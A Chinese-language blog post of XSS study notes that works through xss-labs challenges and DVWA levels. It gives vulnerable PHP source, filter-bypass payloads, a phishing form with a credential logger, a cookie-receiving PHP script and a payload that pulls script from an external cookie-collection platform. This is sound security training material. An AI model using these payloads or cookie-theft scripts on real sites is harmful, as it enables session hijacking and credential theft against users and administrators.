---
title: XSS学习
date: 2020-09-05 20:26:23
---

### 漏洞概述

XSS：“Cross Site Scripting”：“跨站脚本攻击”，因和CSS（层叠样式表重名），因此被命名为XSS来表示"跨站脚本攻击"。

之前说到，既然出现安全问题，必然是外部用户输入恶意字符串而产生的（又可称为：攻击者对参数、输入点可控，同时服务器端对输入的值未经过滤、转义，导致攻击事件发生。）整体的安全事件必然也均这样的经过，漏洞如何`验证`、`影响范围`及`修复`需要我们慢慢学习整理。

#### 原理

因浏览器本身设计缺陷，而浏览器的主要工作是对用户请求的HTML+CSS+Javascript的解释执行，其以前部分浏览器在安全性这块并未做任何验证，导致服务器端对外提供访问后一旦部署相应应用系统，且未对用户提交数据进行过滤将产生XSS攻击。

本质是客户端代码注入攻击，代码类型基本属于前端类：HTML、Javascript、CSS等其他脚本组成。

#### 产生过程

##### 反射型(非持久性)

1. 攻击者构造出特殊代码，其中包含恶意代码
2. 用户打开带有恶意代码URL或网页，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；会进行弹窗告警

##### 存储型(持久性)

1. 攻击者准备好接收Cookie平台
2. 攻击者找到目标系统可留言、修改个人信息处
3. 插入恶意代码及链接
4. 管理员登录系统并对留言信息点击后会触发XSS漏洞
5. 会把管理员登录的Cookie发送到接收平台
6. 攻击者替换Cookie值进行访问，此时权限会提升至管理员

##### DOM型

1. 攻击者构造Javascript或其他脚本
2. 插入到指定位置(URL参数、其他个人信息或其他可修改位置)
3. 点击触发漏洞，构造的恶意代码被执行
4. 结果：可能会弹窗或其他操作

#### 漏洞分类

由以上了解，漏洞可按照以下形式进行分类：

##### 一、非持久型(反射型、DOM型)

指不会一直影响系统，只有每次点击访问后会触发浏览器执行对应恶意代码并作出响应。

##### 二、持久型(存储型)

指会一直留存于对应应用系统内，且如不删除操作会预留至系统内；一旦点击后会触发恶意代码，而且如不删除会每次点击都会触发。

### 漏洞环境

值得推荐的本地漏洞环境可参考如下：

````
DVWA:https://github.com/digininja/DVWA.git
本地搭建XSS:https://zhuanlan.zhihu.com/p/54041627
bwapp:http://www.itsecgames.com/
其他环境待更新...
````

### 在线挑战

值得推荐的线上挑战赛：

```
https://xz.aliyun.com/t/2296
https://xss-quiz.int21h.jp/
其他环境待更新...
```

### 影响范围

按不同类型分析对目标系统会产生哪些影响范围

#### 反射型

Cookie欺骗/Cookie会话攻击（提前搭建接收Cookie文件）

XSS History Hack(利用：getComputedStyle()方法)

#### 存储型

Cookie欺骗/Cookie会话攻击

会话劫持(Session/Cookie)

网络钓鱼

钓鱼脚本

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login</title>
</head>
<body>
    <form method="POST" action="http://xss-lab.me:8888/get.php">
        <input type="text" name="username" value="test"/><br>
        <input type="password" name="password" value="Pass"/><br>
        <input type="submit" name="login" value="Submit">
    </form>
</body>
</html>
```

记录信息

```php
<?php
$data =fopen('login.txt',"a+");
$login = $_POST["username"];
$pass = $_POST["password"];
fwrite($data,"username:$login\n");
fwrite($data,"password:$pass\n");
fclose($data);
Header("location:login.html");
?>
```

下图记录用户提交请求

![image-20200828105754440](/images/XSS/image-20200828105754440.png)

网页挂马(网页内嵌入script、或iframe等标签)

DOS或DDOS

#### DOM型

DOM型和反射型XSS类似因此不再重复写

### 实战验证

#### 反射型

反射型XSS使用网络检索得到一款源码搭建本地测试，反射型`payload`

##### 挑战一

```shell
//未编码
`<script>alert('xss')</script>`
```

```shell
<?php 
ini_set("display_errors", 0);
//外部输入变量
$str = $_GET["name"];
//变量值未经过滤直接输出
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
```

`Result`

![image-20200828134439412](/images/XSS/image-20200828134439412.png)

##### 挑战二

```shell
//初步测试,发现payload直接输出
`<script>alert('xss')</script>`
```

![image-20200828140956492](/images/XSS/image-20200828140956492.png)

```shell
//满足闭合,观察输入payload时输出
`"><script>alert('xss')</script>`
```

```shell
//对变量经过htmlspecialchars函数过滤
<?php 
ini_et("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
```

`Result`

![image-20200828140717307](/images/XSS/image-20200828140717307.png)

##### 挑战三

```shell
//闭合测试，发现>被转义了
`><script>alert('xss')</script>`
```

![image-20200828142634784](/images/XSS/image-20200828142634784.png)

```shell
//不使用<等类似字符进行测试
`'onmouseover=alert(1)//`
```

```shell
//对变量经过两次htmlspecialchars函数过滤
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
```

`Result`

![image-20200828143012943](/images/XSS/image-20200828143012943.png)

##### 挑战四

```shell
//基础测试，发现对<、>进行替换为空
`"><script>alert('xss')</script>`
```

![image-20200828143756092](/images/XSS/image-20200828143756092.png)

```shell
//不使用<等类似字符进行测试
`"onmouseover=alert(1)//`
```

```php+HTML
//对输入变量值中<、>进行替换
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

`Result`

![image-20200828144232008](/images/XSS/image-20200828144232008.png)

##### 挑战五

```shell
//基础测试，发现对<、>进行替换为空
`"><script>alert('xss')</script>`
```

![image-20200828150406623](/images/XSS/image-20200828150406623.png)

```php+HTML
//<script 转换成 <scr_ipt ，on转换成 o_n
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

```shell
//使用伪协议绕过
`"> <a href="javascript:alert(1)">click</a>`
```

`Result`

![image-20200828151240091](/images/XSS/image-20200828151240091.png)

##### 挑战六

```shell
//使用伪协议绕过
`"> <a href="javascript:alert(1)">click</a>`
```

![image-20200828151906636](/images/XSS/image-20200828151906636.png)

````php+HTML
//发现添加了多个属性进行过滤操作
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
````

```shell
//发现并未对大小写过滤，
`"> <a HrEf="javascript:alert(1)">click</a>`
```

`Result`

![image-20200828152455501](/images/XSS/image-20200828152455501.png)

##### 挑战七

```shell
//使用大小写测试
`"> <a HrEf="javascript:alert(1)">click</a>`
```

![image-20200828152734820](/images/XSS/image-20200828152734820.png)

```php+HTML
//添加script替换为空
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

```shell
//重复绕过,
`"><sscriptcript>alert(1)</sscriptcript>`
`"oonnmouseover=alert(1)`
`"><a hrhrefef=javascriscriptpt:alert(1)>click</a>`
```

`Result`

![image-20200828153152250](/images/XSS/image-20200828153152250.png)

##### 挑战八

````shell
//重复测试
`"><sscriptcript>alert(1)</sscriptcript>`
````

![image-20200828153930815](/images/XSS/image-20200828153930815.png)

```php+HTML
//在上面基础上添加了大小写过滤、属性中双引号被转换成HTML实体，无法截断属性，可以使用协议绕过javascript:alert，由于script关键字被过滤，
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
```

[在线实体编码](https://www.qqxiuzi.cn/bianma/zifushiti.php)

```shell
//实体编码，javascript会被替换成javasc_rpt，我们使用&#x72来代替r ,HTML字符实体转换：
`javascrip&#x74;:alert(1)`
`javascript:%61lert(1)`
`javasc&#x72;ipt:alert`1``
`javasc&#x0072;ipt:alert`1``
```

`Result`

![image-20200828154518631](/images/XSS/image-20200828154518631.png)

##### 挑战九

```shell
//实体编码测试
`javascrip&#x74;:alert(1)`
```

![image-20200828154756855](/images/XSS/image-20200828154756855.png)

```php+HTML
//在之前基础上，添加的链接是http://头信息
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

```shell
//添加http://信息
`javascrip&#x74;:alert(1)//http://xxx.com ` //利用注释
`javascrip&#x74;:%0dhttp://xxx.com%0dalert(1) ` //不利用注释
`javascrip&#x74;:%0ahttp://xxx.com%0daalert(1)`  //不利用注释
```

`Result`

![image-20200828155322234](/images/XSS/image-20200828155322234.png)

##### 挑战十

发现一个隐藏输入框

![image-20200828155806918](/images/XSS/image-20200828155806918.png)

```php+HTML
//多了个参数、多了一个输入框且已经隐藏、并对<、>括号进行过滤，htmlspecialchars函数过滤
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

```shell
//添加参数并构造PoC
`keyword = test&t_sort="type="text" onclick = "alert(1)`
`keyword = test&t_sort="type="text" onmouseover="alert(1)`
`keyword = test&t_sort="type="text" onmouseover=alert`1``
```

`Result`

![image-20200828160245970](/images/XSS/image-20200828160245970.png)

##### 挑战十一

之前测试发现无效果，查看源码

```javascript
//比之前多了个请求头REFERER进行指定来源
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

````shell
//修改请求头并修改一下PoC代码
`Referer: " onmouseover=alert(1) type="text"`
`Referer: " onclick="alert(1) type="text"`
````

![image-20200828161500548](/images/XSS/image-20200828161500548.png)

`Result`

![image-20200828161534239](/images/XSS/image-20200828161534239.png)

##### 挑战十二

```javascript
//不再是REFERER请求头，现在更换了User-agent
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

````shell
//修改User-agent插入PoC
`User-Agent: " onmouseover=alert(1) type="text"`
`User-Agent: " onclick="alert(1) type="text"`
````

![image-20200828162042253](/images/XSS/image-20200828162042253.png)

`Result`

![image-20200828162112961](/images/XSS/image-20200828162112961.png)

##### 挑战十三

```php+HTML
//修改请求头Cookie来测试
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

```shell
//修改Cookie
`Cookie: user=call+me+maybe%3F" onmouseover=alert(1) type="text"`
`Cookie: user=call+me+maybe%3F" onclick="alert(1) type="text"`
```

![image-20200828162907084](/images/XSS/image-20200828162907084.png)

`Result`

![image-20200828162927276](/images/XSS/image-20200828162927276.png)

##### 挑战十四

网路搜索：

`此题主要利用exif xss，链接由于网络的原因无法访问，exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，可利用exiftool工具，命令如下：`

```shell
//但是因为域名无法访问了，这题后期再更
`exiftool -FIELD=XSS FILENAME`
`exiftool -Artist=' "><img src=1 onerror=alert(document.domain)>' filename.jpeg`
```

##### 挑战十五

```php+HTML
//ng-include是AngularJS中指令，具有文件包含功能"<div ng-include="'myFile.htm'"></div>
"，和php中include函数类似。可通过src属性来加载以上是挑战任意一个。
//这里需要注意，其中远程加载google的js，需要"扶梯子"才行。
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>
```

```shell
//这里包含挑战二来实现XSS
`/level15.php?src='level2.php?keyword="><img src=x onerror=alert(1)>'`
```

`Result`

![image-20200828200852458](/images/XSS/image-20200828200852458.png)

##### 挑战十六

```php+HTML
//对变量的值进行script、/、空格等替换&nbsp，用%0d，%0a等绕过
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
```

```shell
//对字符进行编码
`<img%0dsrc=1%0donerror=alert(16)>`
`<iframe%0dsrc=0%0donmouseover=alert｀16｀></iframe>`
`<svg%0aonload=alert｀16｀></svg>`
```

`Result`

![image-20200828203522683](/images/XSS/image-20200828203522683.png)

##### 挑战十七

```php+HTML
//加载swf文件，并对两个参数arg01和arg02值进行过滤
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
```

```shell
//使用编码%0a、%0b绕过。
`arg01=123&arg02= onmouseover=alert(1)`
`arg01=123&arg02=%20onmousedown=alert`1``
`arg01=123&arg02=  onmouseover=alert(1) type="text"`
``/level17.php?arg01=a&arg02=%20onmouseover=alert`1``
```

`Result`

![image-20200828220707491](/images/XSS/image-20200828220707491.png)

##### 挑战十八

````php+HTML
//和挑战十七的试题一致，可直接拿来利用测试
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
````

```shell
//使用编码%0a、%0b绕过。
`arg01=123&arg02= onmouseover=alert(1)`
`arg01=123&arg02=%20onmousedown=alert`1``
`arg01=123&arg02=  onmouseover=alert(1) type="text"`
`/level17.php?arg01=a&arg02=%20onmouseover=alert`1``
```

`Result`

![image-20200829095926257](/images/XSS/image-20200829095926257.png)

##### 挑战十九

````php+HTML
//此题主要介绍考察Flash XSS
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
````

直接访问URL

```
http://xss-lab.me:8888/level19.php?arg01=a&arg02=b
```

![image-20200829104903728](/images/XSS/image-20200829104903728.png)

swf文件直接输出参数值

````shell
//使用a标签加载javascript协议弹窗
`/level19.php?arg01=version&arg02=<a href="javascript:alert('XSS')">XSS_Click</a>`
````

![image-20200829105426617](/images/XSS/image-20200829105426617.png)

点击触发漏洞

`Result`

![image-20200829105522767](/images/XSS/image-20200829105522767.png)

##### 挑战二十

```php+HTML
//网络搜索未找到对应解析此题，只知道此题还是Flash XSS。
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
```

`payload`

```shell
//使用以下payload可实现，备注参数arg01的值必须是id不然都不弹窗；不理解其意；
`level20.php?arg01=id&arg02=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height`
```

`Result`

![image-20200829135137358](/images/XSS/image-20200829135137358.png)

参考以上学习可简单了解XSS反射型，但如想继续研究建议可网络搜索在线挑战并练习或参考网上Writeup。

#### 存储型

存储型XSS  是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码，存储型XSS可以持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行，存储型XSS就发生了。

存储型XSS攻击方式主要是嵌入一段远程或者第三方域上的JS代码，并在目标域执行这些代码。存储型XSS会造成Cookie泄露，破坏页面正常的结构与样式，重定向访问恶意网站等。

##### 搭建接收平台

参考下面的`cookie.php`文件获取网站cookie方式；保存单文件至当前文件夹内；也可以使用互联网上的接收平台[XSS_Top](https://webxss.top/)

##### 实战

###### DVWA-low

看到输入框长度有限制，这里可以通过修改JS，或者使用Burpsuite来实现。

![image-20200831171126727](/images/XSS/image-20200831171126727.png)

```php+HTML
DVWA-Low
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );
	// Sanitize message input
	$message = stripslashes( $message );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitize name input
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}
?>
```

截获数据并修改Message的值

![image-20200831171424381](/images/XSS/image-20200831171424381.png)

接收平台此时会收到Cookie值

![image-20200831171401476](/images/XSS/image-20200831171401476.png)

浏览器插件添加Cookie值并绕过登录

![image-20200831173056272](/images/XSS/image-20200831173056272.png)

接收Cookie的php文件

```php+HTML
<?php

$cookie = $_GET['cookie']; //以GET方式获取cookie变量值
$ip = getenv ('REMOTE_ADDR'); //远程主机IP地址
$time=date('Y-m-d g:i:s'); //以“年-月-日 时：分：秒”的格式显示时间
$referer=getenv ('HTTP_REFERER'); //链接来源
$agent = $_SERVER['HTTP_USER_AGENT']; //用户浏览器类型

$fp = fopen('cookie.txt', 'a'); //打开cookie.txt，若不存在则创建它
fwrite($fp," IP: " .$ip. "\n Date and Time: " .$time. "\n User Agent:".$agent."\n Referer: ".$referer."\n Cookie: ".$cookie."\n\n\n"); //写入文件
fclose($fp); //关闭文件

header("Location: http://www.baidu.com")//重定向到baidu，防止发现
?>
```

直接访问生成cookie.txt文件

![image-20200831183628978](/images/XSS/image-20200831183628978.png)

###### DVWA-Medium

中级和低级比较显示使用部分函数进行过滤。

```php
addslashes()				使用反斜线引用字符串
htmlspecialchars()	将特殊字符转换为 HTML 实体
str_replace()				子字符串替换
```

![image-20200901112252053](/images/XSS/image-20200901112252053.png)

抓包绕过

```shell
`<sc<script>ript>alert(/xss/)</script>`
大小写绕过
`<Script>alert(/xss/)</script>`
`</textarea>'"><Script src=https://webxss.top/xss/BjE4XZ?1598931992></script>`
```

弹窗检测

![image-20200901134156567](/images/XSS/image-20200901134156567.png)

![image-20200901134205736](/images/XSS/image-20200901134205736.png)

```shell
`<img src=1 οnerrοr=alert(1)>`
```

###### DVWA-high

高和中比较发现采用正则表达式对script进行过滤了；但可尝试使用其他标签<img>等

![image-20200901135011353](/images/XSS/image-20200901135011353.png)

```html
`<img src=1 onerror=alert(1)>`
```

![image-20200901140548264](/images/XSS/image-20200901140548264.png)

![image-20200901140610422](/images/XSS/image-20200901140610422.png)

#### DOM型

##### DVWA-low

low版本不存在任何显示，default参数值设置为payload。

```php+HTML
<?php
# No protections, anything goes
?>
```

![image-20200901142115894](/images/XSS/image-20200901142115894.png)

```shell
`<option value="%3Cscript%3Ealert(%27xss%27)%3C/script%3E"><script>alert('xss')</script>
</option>`
# script标签及值放在option标签内<dom树执行结果>
```

##### DVWA-Medium

中级出现了对值<script进行判断

```php+HTML
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
	$default = $_GET['default'];
	
	# Do not allow script tags
	if (stripos ($default, "<script") !== false) {
		header ("location: ?default=English");
		exit;
	}
}
?>
```

```shell
# 此时使用`<img src=1 onerror=alert(1)>`
# 如下图所示，发现我们的语句被插入到了value值中，并没有插入到option标签的值中，所以img标签并没有发起任何作用。
```

![image-20200901145238002](/images/XSS/image-20200901145238002.png)

构造语句闭合option标签：

```shell
`></option><img src=1 onerror=alert(1)>`
```

![image-20200901145626304](/images/XSS/image-20200901145626304.png)

\> 被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入;构造语句去闭合select标签

```shell
# 完成标签闭合完成
`></option></select><img src=1 onerror=alert('xss')>`
```

![image-20200901145826892](/images/XSS/image-20200901145826892.png)

##### DVWA-High

先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，语句就没有可能插入到页面中了。

### Tools

#### 黑盒测试

##### AWVS

![image-20200831112823669](/images/XSS/image-20200831112823669.png)

一款自动化扫描工具，主要利用爬虫形式对整个网站进行爬取后再进行内部payload测试。这样就可以检测网站是否存在XSS漏洞等。

目前最新版本已经AWVS 13支持Web端配置如上图所示

##### BruteXSS

[项目地址](https://github.com/rajeshmajumdar/BruteXSS.git)

![image-20200831111313145](/images/XSS/image-20200831111313145.png)

BruteXSS 是一个非常强大和快速的跨站点脚本检测工具，可用于暴力注入参数。BruteXSS 从指定的词库加载多种有效载荷进行注入，并且使用指定的载荷和扫描检查这些存在 XSS 漏洞的参数。得益于非常强大的扫描功能，在执行任务时，BruteXSS 非常准确而且极少误报。 BruteXSS 支持 POST 和 GET 请求，并适应现代 Web 应用程序。

**特点**

1. XSS 爆破
2. XSS 扫描
3. GET/POST 请求
4. 可包含自定义单词
5. 人性化的 UI

其它工具自行搜索，不过基于以上工具可基本满足平时测试和复现；其他工具网络搜索即可。

##### BeEF

BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。

![logo](/images/XSS/logo.png)

参考另一篇BeEF使用。

#### 白盒测试

关于XSS的代码审计主要就是从`接收参数`和`输出函数`及一些关键词入手。

PHP中常见`接收参数`的方式有：`$_GET`、`$_POST`、`$_REQUEST`等等，

PHP中常见`输出函数`的方式有：`print`，`print_r`，`echo`，`printf`，`sprintf`，`die`，`var_dump`，`var_export`

可以搜索`接收参数`的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。

也可以搜索`输出函数`这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。

大多数程序会对接收参数封装在公共文件的函数中统一调用，就需要审计这些公共函数看有没有过滤，能否绕过等等。

DOM型注入同样可以搜索一些JS操作DOM元素的关键词进行审计。

### Bypass

汇总部分绕过xss过滤方式，更多可搜“`XSS Filter Evasion Cheat Sheet_SecPulse`”一份专门介绍XSS的绕过。

#### 大小写

```shell
`<ScRIpT>alert('XSS')</sCRIpT>`
```

#### 编码

```shell
1、十六进制编码
2、jsfuck编码
3、url编码
4、unicode编码等
5、`<0x736372697074>alert('123')</0x736372697074>`
6、`<img src="1" onerror="alert&#x28;1&#x29;">`
```

#### magic_quotes_gpc

```shell
//绕过可参考以下
`<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script>`
```

#### 标签

##### 闭合

```shell
//查看源码输出位置是否存在标签未闭合情况来进行绕过
`"><script>alert(/123/)</script>`
`</script><script>alert(1)</script>`
```

##### 其它标签

```shell
//使用较多方式是通过报错形式来添加标签进行绕过
`<img src="x" onerror="alert('XSS')">`
`<button onclick="javascript:alert('XSS')>XSS</button">`
`<title><img a="</title><img/src=1 onerror=alert(1)//">`
`"onsubmit=javascript:alert(1)%20name="a`
`<details open ontoggle="eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))">`
`<video src="http://www.0dutv.com/plug/down/up2.php/104678898.mp3" onprogress=('body').perpend(123);('body')></video>`
```

#### 替换

| 符号 | 替换     |
| ---- | -------- |
| %0a  | 替换空格 |
| %d   | 替换空格 |
| /**/ | 替换空格 |
| %00  | 截断     |
| ``   | 替换括号 |

#### 重复绕过

```shell
//对部分字符过滤及替换时，采用重复形式进行绕过
`<img ononerrorerror="123">`
`<script>alalertert(123)</script>`
```

#### 宽子节绕过

`GB系列`编码，尝试宽字节字符：

 `%c0`、`%bf`、`%5c`、`%df`

#### 事件属性

| 属性        | 解析                           |
| ----------- | ------------------------------ |
| onclick     | 鼠标点击事件                   |
| onerror     | 当加载文档或图像时发生某个错误 |
| onload      | 某个页面或图像被完成加载       |
| onmousemove | 鼠标被移动                     |
| 等其它事件  |                                |

#### 长度限制

input标签中有maxlength限制传参长度，抓包修改发送数据。

#### PHP部分函数

php内包含部分过滤及转义函数及绕过方式统计

| 序号 | PHP函数        | 函数解析                   | 绕过                                                         |
| ---- | -------------- | -------------------------- | ------------------------------------------------------------ |
| 1    | str_replace()  | 该函数区分大小写           | 使用大小写进行绕过                                           |
| 2    | str_ireplace() | 该函数不区分大小写         | 双写绕过，如：<scscriptirpt>                                 |
| 3    | preg_replace() | 正则表达式的搜索和替换     | 使用html标签事件绕过，如：`<img src=xx onerror=alert(1)>`    |
| 4    | htmlentities() | 将字符转换为 HTML 转义字符 | htmlentities(string,quotestyle,character-set)函数的参数二，<br />默认情况下，是不对单引号进行编码的，仍可以用事件来触发XSS |

### 修复建议

不管是反射型、存储型还是DOM型XSS可对外部提交的参数进行过滤及转义操作将达到简单防护功效；

<center>学习～</center>
### 参考

```html
//反射型挑战解析
https://my.oschina.net/u/4332632/blog/3374751
https://www.cnblogs.com/bmjoker/p/9446472.html
bypass姿势
https://owasp.org/www-community/xss-filter-evasion-cheatsheet
https://xz.aliyun.com/t/1678/
```
